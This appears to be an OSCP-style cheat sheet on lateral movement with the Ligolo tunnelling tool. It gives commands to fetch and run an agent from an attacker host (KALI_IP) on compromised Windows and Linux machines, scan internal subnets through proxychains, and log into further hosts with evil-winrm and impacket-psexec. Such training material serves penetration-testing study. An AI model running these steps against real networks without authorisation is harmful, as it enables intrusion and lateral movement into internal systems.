Pivoting with Ligolo (Single & Double Pivot)

1. After Reverse Shell (Machine A)

We have a shell on Machine A. First step is to identify internal networks.

Linux

ip addr
ip route

Windows

ipconfig /all
route print

Goal: Find internal subnet (e.g. 192.168.1.0/24)

2. Setup Ligolo (Kali)
git clone https://github.com/afklm/ligolo.git
cd ligolo
make

./ligolo-server -listen 0.0.0.0:1080

SOCKS5 proxy running on 127.0.0.1:1080

3. Deploy Agent on Machine A

Linux

wget http://KALI_IP/ligolo-client -O /tmp/ligolo
chmod +x /tmp/ligolo
/tmp/ligolo -s KALI_IP:1080

Windows

iwr http://KALI_IP/ligolo.exe -OutFile C:\Users\Public\ligolo.exe
C:\Users\Public\ligolo.exe -s KALI_IP:1080
4. Pivot A → Internal Network
proxychains nmap -sS -Pn -n 192.168.1.0/24

Find Machine B (example: 192.168.1.20)

5. Access Machine B
proxychains evil-winrm -i 192.168.1.20 -u user -p password
proxychains ssh user@192.168.1.20

Now we have access to Machine B.

6. Double Pivot (A → B → C)

Machine B has another internal network (e.g. 10.10.10.0/24)

Step 1 – Enumerate from B

Linux

ip route

Windows

route print

Example new subnet: 10.10.10.0/24

Step 2 – Transfer Ligolo to B

# From your existing shell on B
iwr http://KALI_IP/ligolo.exe -OutFile ligolo.exe

Step 3 – Run second agent (B → Kali)

ligolo.exe -s KALI_IP:1080

Now Kali has access to BOTH networks.

Step 4 – Scan deeper network (C)

proxychains nmap -sS -Pn 10.10.10.0/24

Find Machine C.

Step 5 – Exploit Machine C

proxychains evil-winrm -i 10.10.10.30 -u user -p password
proxychains impacket-psexec domain/user:password@10.10.10.30
7. OSCP Mental Model
  1. Compromise Machine A
  2. Enumerate internal network
  3. Pivot with Ligolo
  4. Find Machine B
  5. Compromise Machine B
  6. Enumerate again
  7. Find deeper subnet
  8. Deploy second Ligolo agent
  9. Scan new network
  10. Compromise Machine C
8. Pro Tips
  • Always re-enumerate after pivoting
  • Each machine = new network visibility
  • Run Ligolo on EVERY pivot point
  • Use proxychains for everything
  • Focus on SMB, WinRM, LDAP internally
